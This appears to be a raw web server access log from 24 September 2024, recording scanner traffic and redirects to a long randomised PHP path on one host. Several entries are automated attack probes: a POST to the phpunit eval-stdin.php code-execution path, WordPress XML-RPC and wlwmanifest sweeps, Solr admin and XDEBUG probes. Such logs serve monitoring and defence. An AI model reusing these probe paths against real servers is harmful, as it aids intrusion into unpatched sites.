167.71.211.130 - - [24/Sep/2024:05:10:42 +0000] "HEAD /old/xmlrpc.php HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0"
167.71.211.130 - - [24/Sep/2024:05:10:43 +0000] "HEAD /new/xmlrpc.php HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:79.0) Gecko/20100101 Firefox/79.0"
167.71.211.130 - - [24/Sep/2024:05:10:44 +0000] "HEAD /blog/xmlrpc.php HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:79.0) Gecko/20100101 Firefox/79.0"
198.13.62.122 - - [24/Sep/2024:05:11:22 +0000] "GET / HTTP/1.1" 302 8287 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
198.13.62.122 - - [24/Sep/2024:05:11:24 +0000] "GET /MY2MBI12L0rkxShZDWShQL2MBI12L0rkxShZDWShQL/SIGNKi138z1t64D3gjJBGHL489ON.php HTTP/1.1" 200 863 "http://searchngo.online" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
106.219.167.131 - - [24/Sep/2024:05:24:05 +0000] "GET / HTTP/1.1" 302 50510 "-" "-"
106.219.167.131 - - [24/Sep/2024:05:24:06 +0000] "GET /MY2MBI12L0rkxShZDWShQL2MBI12L0rkxShZDWShQL/SIGNKi138z1t64D3gjJBGHL489ON.php HTTP/1.1" 200 1821 "-" "-"
64.62.156.17 - - [24/Sep/2024:05:24:10 +0000] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\xF0|)\xD4f\x8C[\x8E_\xA0\xEC\xB2\x83xiw\x19\x1EU\xC6\xBB^\x9D\x0E\xAEsG~\xC0\x124P\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 150 "-" "-"
147.185.133.3 - - [24/Sep/2024:05:42:00 +0000] "GET / HTTP/1.1" 302 8290 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
147.185.133.3 - - [24/Sep/2024:05:42:00 +0000] "GET /MY2MBI12L0rkxShZDWShQL2MBI12L0rkxShZDWShQL/SIGNKi138z1t64D3gjJBGHL489ON.php HTTP/1.1" 200 863 "http://5.161.235.50:80/" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
185.16.39.118 - - [24/Sep/2024:05:46:11 +0000] "GET / HTTP/1.1" 302 8287 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
149.50.103.48 - - [24/Sep/2024:05:48:55 +0000] "GET / HTTP/1.1" 302 50509 "-" "-"
131.202.14.152 - - [24/Sep/2024:05:55:43 +0000] "GET / HTTP/1.1" 302 8289 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0"
131.202.14.152 - - [24/Sep/2024:05:55:43 +0000] "GET /MY2MBI12L0rkxShZDWShQL2MBI12L0rkxShZDWShQL/SIGNKi138z1t64D3gjJBGHL489ON.php HTTP/1.1" 200 863 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0"
185.191.126.213 - - [24/Sep/2024:05:56:52 +0000] "GET / HTTP/1.1" 302 50509 "-" "-"
192.175.111.251 - - [24/Sep/2024:05:57:24 +0000] "GET / HTTP/1.1" 302 50510 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36"
192.175.111.251 - - [24/Sep/2024:05:57:24 +0000] "GET /MY2MBI12L0rkxShZDWShQL2MBI12L0rkxShZDWShQL/SIGNKi138z1t64D3gjJBGHL489ON.php HTTP/1.1" 200 1821 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36"
192.175.111.243 - - [24/Sep/2024:05:57:24 +0000] "GET / HTTP/1.1" 302 50510 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36"
192.175.111.243 - - [24/Sep/2024:05:57:24 +0000] "GET /MY2MBI12L0rkxShZDWShQL2MBI12L0rkxShZDWShQL/SIGNKi138z1t64D3gjJBGHL489ON.php HTTP/1.1" 200 1821 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36"
192.175.111.243 - - [24/Sep/2024:05:57:24 +0000] "GET /favicon.ico HTTP/1.1" 200 22486 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36"
64.15.129.104 - - [24/Sep/2024:05:57:24 +0000] "GET / HTTP/1.1" 302 50510 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36"
64.15.129.104 - - [24/Sep/2024:05:57:25 +0000] "GET /MY2MBI12L0rkxShZDWShQL2MBI12L0rkxShZDWShQL/SIGNKi138z1t64D3gjJBGHL489ON.php HTTP/1.1" 200 1821 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36"
192.175.111.244 - - [24/Sep/2024:05:57:25 +0000] "GET / HTTP/1.1" 302 50510 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36"
192.175.111.244 - - [24/Sep/2024:05:57:25 +0000] "GET /MY2MBI12L0rkxShZDWShQL2MBI12L0rkxShZDWShQL/SIGNKi138z1t64D3gjJBGHL489ON.php HTTP/1.1" 200 1821 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36"
83.97.73.245 - - [24/Sep/2024:05:58:04 +0000] "GET / HTTP/1.1" 302 8290 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
83.97.73.245 - - [24/Sep/2024:05:58:04 +0000] "GET /MY2MBI12L0rkxShZDWShQL2MBI12L0rkxShZDWShQL/SIGNKi138z1t64D3gjJBGHL489ON.php HTTP/1.1" 200 863 "http://5.161.235.50:80/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
83.97.73.245 - - [24/Sep/2024:06:03:56 +0000] "GET / HTTP/1.1" 302 8292 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
83.97.73.245 - - [24/Sep/2024:06:03:56 +0000] "GET /MY2MBI12L0rkxShZDWShQL2MBI12L0rkxShZDWShQL/SIGNKi138z1t64D3gjJBGHL489ON.php HTTP/1.1" 200 863 "http://5.161.235.50:80" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
66.249.66.19 - - [24/Sep/2024:06:04:51 +0000] "GET /robots.txt HTTP/1.1" 200 57 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
83.97.73.245 - - [24/Sep/2024:06:10:40 +0000] "POST /Autodiscover/Autodiscover.xml HTTP/1.1" 302 8290 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
83.97.73.245 - - [24/Sep/2024:06:10:40 +0000] "GET /Autodiscover/MY2MBI12L0rkxShZDWShQL2MBI12L0rkxShZDWShQL/SIGNKi138z1t64D3gjJBGHL489ON.php HTTP/1.1" 404 47 "http://5.161.235.50:80/Autodiscover/Autodiscover.xml" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
89.190.156.137 - - [24/Sep/2024:06:12:33 +0000] "GET / HTTP/1.0" 302 50426 "-" "ivre-masscan/1.3 https://github.com/robertdavidgraham/"
83.97.73.245 - - [24/Sep/2024:06:18:44 +0000] "POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 47 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
95.214.55.43 - - [24/Sep/2024:06:19:25 +0000] "GET /webpages/login.html HTTP/1.1" 302 50509 "-" "Go-http-client/1.1"
95.214.55.43 - - [24/Sep/2024:06:19:25 +0000] "GET /webpages/MY2MBI12L0rkxShZDWShQL2MBI12L0rkxShZDWShQL/SIGNKi138z1t64D3gjJBGHL489ON.php HTTP/1.1" 404 27 "http://5.161.235.50:80/webpages/login.html" "Go-http-client/1.1"
83.97.73.245 - - [24/Sep/2024:06:23:25 +0000] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 47 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
185.224.128.47 - - [24/Sep/2024:06:28:09 +0000] "GET / HTTP/1.1" 302 50480 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
89.104.110.169 - - [24/Sep/2024:06:34:18 +0000] "GET / HTTP/1.1" 302 8287 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36"
45.90.60.101 - - [24/Sep/2024:06:34:19 +0000] "GET /MY2MBI12L0rkxShZDWShQL2MBI12L0rkxShZDWShQL/SIGNKi138z1t64D3gjJBGHL489ON.php HTTP/1.1" 200 863 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36"
89.104.100.86 - - [24/Sep/2024:06:34:19 +0000] "GET /favicon.ico HTTP/1.1" 200 22486 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36"
83.97.73.245 - - [24/Sep/2024:06:36:56 +0000] "GET /solr/admin/info/system?wt=json HTTP/1.1" 302 8290 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
83.97.73.245 - - [24/Sep/2024:06:36:56 +0000] "GET /solr/admin/info/MY2MBI12L0rkxShZDWShQL2MBI12L0rkxShZDWShQL/SIGNKi138z1t64D3gjJBGHL489ON.php HTTP/1.1" 404 47 "http://5.161.235.50:80/solr/admin/info/system?wt=json" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
95.214.55.138 - - [24/Sep/2024:06:40:36 +0000] "GET / HTTP/1.1" 302 8288 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
34.79.174.58 - - [24/Sep/2024:06:40:40 +0000] "GET / HTTP/1.1" 302 50514 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36"
34.79.174.58 - - [24/Sep/2024:06:40:45 +0000] "GET /MY2MBI12L0rkxShZDWShQL2MBI12L0rkxShZDWShQL/SIGNKi138z1t64D3gjJBGHL489ON.php HTTP/1.1" 200 1821 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36"
188.166.178.123 - - [24/Sep/2024:06:41:58 +0000] "GET /wp-login.php HTTP/1.1" 404 47 "-" "Mozilla/5.0"
66.249.66.38 - - [24/Sep/2024:06:49:51 +0000] "GET /robots.txt HTTP/1.1" 200 57 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
188.166.178.123 - - [24/Sep/2024:06:53:21 +0000] "GET / HTTP/1.1" 302 50510 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36"
188.166.178.123 - - [24/Sep/2024:06:53:22 +0000] "GET / HTTP/1.1" 302 50227 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36"
188.166.178.123 - - [24/Sep/2024:06:53:22 +0000] "GET /wp-includes/wlwmanifest.xml HTTP/1.1" 302 50227 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36"
188.166.178.123 - - [24/Sep/2024:06:53:23 +0000] "GET /xmlrpc.php?rsd HTTP/1.1" 404 27 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36"
188.166.178.123 - - [24/Sep/2024:06:53:23 +0000] "GET / HTTP/1.1" 302 50212 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36"
188.166.178.123 - - [24/Sep/2024:06:53:23 +0000] "GET /blog/wp-includes/wlwmanifest.xml HTTP/1.1" 302 50227 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36"
188.166.178.123 - - [24/Sep/2024:06:53:24 +0000] "GET /web/wp-includes/wlwmanifest.xml HTTP/1.1" 302 50227 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36"
188.166.178.123 - - [24/Sep/2024:06:53:24 +0000] "GET /wordpress/wp-includes/wlwmanifest.xml HTTP/1.1" 302 50227 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36"
188.166.178.123 - - [24/Sep/2024:06:53:25 +0000] "GET /website/wp-includes/wlwmanifest.xml HTTP/1.1" 302 50227 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36"
188.166.178.123 - - [24/Sep/2024:06:53:25 +0000] "GET /wp/wp-includes/wlwmanifest.xml HTTP/1.1" 302 50227 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36"
188.166.178.123 - - [24/Sep/2024:06:53:26 +0000] "GET /news/wp-includes/wlwmanifest.xml HTTP/1.1" 302 50227 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36"
188.166.178.123 - - [24/Sep/2024:06:53:26 +0000] "GET /2018/wp-includes/wlwmanifest.xml HTTP/1.1" 302 50227 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36"
188.166.178.123 - - [24/Sep/2024:06:53:26 +0000] "GET /2019/wp-includes/wlwmanifest.xml HTTP/1.1" 302 50227 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36"
188.166.178.123 - - [24/Sep/2024:06:53:27 +0000] "GET /shop/wp-includes/wlwmanifest.xml HTTP/1.1" 302 50227 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36"
188.166.178.123 - - [24/Sep/2024:06:53:27 +0000] "GET /wp1/wp-includes/wlwmanifest.xml HTTP/1.1" 302 50227 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36"
188.166.178.123 - - [24/Sep/2024:06:53:27 +0000] "GET /test/wp-includes/wlwmanifest.xml HTTP/1.1" 302 50227 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36"
188.166.178.123 - - [24/Sep/2024:06:53:28 +0000] "GET /media/wp-includes/wlwmanifest.xml HTTP/1.1" 302 50227 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36"
188.166.178.123 - - [24/Sep/2024:06:53:28 +0000] "GET /wp2/wp-includes/wlwmanifest.xml HTTP/1.1" 302 50227 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36"
188.166.178.123 - - [24/Sep/2024:06:53:29 +0000] "GET /site/wp-includes/wlwmanifest.xml HTTP/1.1" 302 50227 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36"
188.166.178.123 - - [24/Sep/2024:06:53:29 +0000] "GET /cms/wp-includes/wlwmanifest.xml HTTP/1.1" 302 50227 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36"
188.166.178.123 - - [24/Sep/2024:06:53:30 +0000] "GET /sito/wp-includes/wlwmanifest.xml HTTP/1.1" 302 50227 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36"
188.166.178.123 - - [24/Sep/2024:06:53:30 +0000] "" 400 0 "-" "-"
199.45.155.91 - - [24/Sep/2024:06:54:08 +0000] "GET / HTTP/1.1" 302 50509 "-" "-"
199.45.155.91 - - [24/Sep/2024:06:54:12 +0000] "GET / HTTP/1.1" 302 8285 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
199.45.155.91 - - [24/Sep/2024:06:54:13 +0000] "PRI * HTTP/2.0" 400 150 "-" "-"
199.45.155.91 - - [24/Sep/2024:06:54:17 +0000] "GET /MY2MBI12L0rkxShZDWShQL2MBI12L0rkxShZDWShQL/SIGNKi138z1t64D3gjJBGHL489ON.php HTTP/1.1" 200 863 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
199.45.155.91 - - [24/Sep/2024:06:54:17 +0000] "GET /../favicon.ico HTTP/1.1" 400 150 "-" "-"
199.45.155.91 - - [24/Sep/2024:06:54:18 +0000] "GET /../favicon.ico HTTP/1.1" 400 150 "-" "-"
199.45.155.91 - - [24/Sep/2024:06:54:18 +0000] "GET /favicon.ico HTTP/1.1" 200 22486 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
199.45.155.91 - - [24/Sep/2024:06:54:19 +0000] "PRI * HTTP/2.0" 400 150 "-" "-"
199.45.155.91 - - [24/Sep/2024:06:54:19 +0000] "GET / HTTP/1.1" 302 8291 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
185.242.177.4 - - [24/Sep/2024:07:00:11 +0000] "GET / HTTP/1.1" 302 8285 "-" "python-requests/2.32.3"
185.242.177.4 - - [24/Sep/2024:07:00:12 +0000] "GET / HTTP/1.1" 302 8288 "-" "python-requests/2.32.3"
185.242.177.4 - - [24/Sep/2024:07:00:12 +0000] "GET / HTTP/1.1" 302 8288 "-" "python-requests/2.32.3"
185.242.177.4 - - [24/Sep/2024:07:00:12 +0000] "GET /MY2MBI12L0rkxShZDWShQL2MBI12L0rkxShZDWShQL/SIGNKi138z1t64D3gjJBGHL489ON.php HTTP/1.1" 200 863 "-" "python-requests/2.32.3"
185.242.177.4 - - [24/Sep/2024:07:00:12 +0000] "GET /MY2MBI12L0rkxShZDWShQL2MBI12L0rkxShZDWShQL/SIGNKi138z1t64D3gjJBGHL489ON.php HTTP/1.1" 200 863 "-" "python-requests/2.32.3"
185.242.177.4 - - [24/Sep/2024:07:00:12 +0000] "GET / HTTP/1.1" 302 8281 "-" "python-requests/2.32.3"
185.242.177.4 - - [24/Sep/2024:07:00:12 +0000] "GET /MY2MBI12L0rkxShZDWShQL2MBI12L0rkxShZDWShQL/SIGNKi138z1t64D3gjJBGHL489ON.php HTTP/1.1" 200 863 "-" "python-requests/2.32.3"
185.242.177.4 - - [24/Sep/2024:07:00:12 +0000] "GET / HTTP/1.1" 302 8289 "-" "python-requests/2.32.3"
185.242.177.4 - - [24/Sep/2024:07:00:12 +0000] "GET / HTTP/1.1" 302 8289 "-" "python-requests/2.32.3"
185.242.177.4 - - [24/Sep/2024:07:00:12 +0000] "GET /MY2MBI12L0rkxShZDWShQL2MBI12L0rkxShZDWShQL/SIGNKi138z1t64D3gjJBGHL489ON.php HTTP/1.1" 200 863 "-" "python-requests/2.32.3"
185.242.177.4 - - [24/Sep/2024:07:00:12 +0000] "GET /MY2MBI12L0rkxShZDWShQL2MBI12L0rkxShZDWShQL/SIGNKi138z1t64D3gjJBGHL489ON.php HTTP/1.1" 200 863 "-" "python-requests/2.32.3"
185.242.177.4 - - [24/Sep/2024:07:00:12 +0000] "GET /MY2MBI12L0rkxShZDWShQL2MBI12L0rkxShZDWShQL/SIGNKi138z1t64D3gjJBGHL489ON.php HTTP/1.1" 200 863 "-" "python-requests/2.32.3"
83.97.73.245 - - [24/Sep/2024:07:06:51 +0000] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 302 8288 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
103.149.177.240 - - [24/Sep/2024:07:06:52 +0000] "GET / HTTP/1.1" 302 50510 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36"
103.149.177.240 - - [24/Sep/2024:07:06:53 +0000] "GET /wp-includes/ID3/license.txt HTTP/1.1" 302 50227 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36"
103.149.177.240 - - [24/Sep/2024:07:06:53 +0000] "GET /feed/ HTTP/1.1" 302 50227 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36"
103.149.177.240 - - [24/Sep/2024:07:06:53 +0000] "GET /xmlrpc.php?rsd HTTP/1.1" 404 27 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36"
103.149.177.240 - - [24/Sep/2024:07:06:54 +0000] "GET /blog/wp-includes/wlwmanifest.xml HTTP/1.1" 302 50227 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36"
103.149.177.240 - - [24/Sep/2024:07:06:54 +0000] "GET /web/wp-includes/wlwmanifest.xml HTTP/1.1" 302 50227 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36"
103.149.177.240 - - [24/Sep/2024:07:06:55 +0000] "GET /wordpress/wp-includes/wlwmanifest.xml HTTP/1.1" 302 50227 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36"
103.149.177.240 - - [24/Sep/2024:07:06:55 +0000] "GET /wp/wp-includes/wlwmanifest.xml HTTP/1.1" 302 50227 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36"
103.149.177.240 - - [24/Sep/2024:07:06:55 +0000] "GET /2020/wp-includes/wlwmanifest.xml HTTP/1.1" 302 50227 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36"
103.149.177.240 - - [24/Sep/2024:07:06:56 +0000] "GET /2019/wp-includes/wlwmanifest.xml HTTP/1.1" 302 50227 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36"
103.149.177.240 - - [24/Sep/2024:07:06:57 +0000] "GET /2021/wp-includes/wlwmanifest.xml HTTP/1.1" 302 50227 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36"
103.149.177.240 - - [24/Sep/2024:07:06:57 +0000] "GET /shop/wp-includes/wlwmanifest.xml HTTP/1.1" 302 50227 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36"
103.149.177.240 - - [24/Sep/2024:07:06:58 +0000] "GET /wp1/wp-includes/wlwmanifest.xml HTTP/1.1" 302 50227 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36"
103.149.177.240 - - [24/Sep/2024:07:06:58 +0000] "GET /test/wp-includes/wlwmanifest.xml HTTP/1.1" 302 50227 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36"
103.149.177.240 - - [24/Sep/2024:07:06:59 +0000] "GET /site/wp-includes/wlwmanifest.xml HTTP/1.1" 302 50227 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36"
103.149.177.240 - - [24/Sep/2024:07:06:59 +0000] "GET /cms/wp-includes/wlwmanifest.xml HTTP/1.1" 302 50227 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36"
103.149.177.240 - - [24/Sep/2024:07:06:59 +0000] "" 400 0 "-" "-"
187.45.67.68 - - [24/Sep/2024:07:18:58 +0000] "GET / HTTP/1.1" 302 50506 "-" "-"
34.96.52.3 - - [24/Sep/2024:07:21:09 +0000] "GET / HTTP/1.1" 302 8287 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/122.0.6261.62 Mobile/15E148 Safari/604.1"
34.96.52.3 - - [24/Sep/2024:07:21:09 +0000] "GET /MY2MBI12L0rkxShZDWShQL2MBI12L0rkxShZDWShQL/SIGNKi138z1t64D3gjJBGHL489ON.php HTTP/1.1" 200 863 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/122.0.6261.62 Mobile/15E148 Safari/604.1"
34.96.52.3 - - [24/Sep/2024:07:21:09 +0000] "GET / HTTP/1.1" 302 8255 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/122.0.6261.62 Mobile/15E148 Safari/604.1"
34.96.52.3 - - [24/Sep/2024:07:21:09 +0000] "GET /MY2MBI12L0rkxShZDWShQL2MBI12L0rkxShZDWShQL/SIGNKi138z1t64D3gjJBGHL489ON.php HTTP/1.1" 200 863 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/122.0.6261.62 Mobile/15E148 Safari/604.1"
34.96.52.3 - - [24/Sep/2024:07:21:33 +0000] "GET /favicon.ico HTTP/1.1" 200 22486 "-" "python-requests/2.31.0"
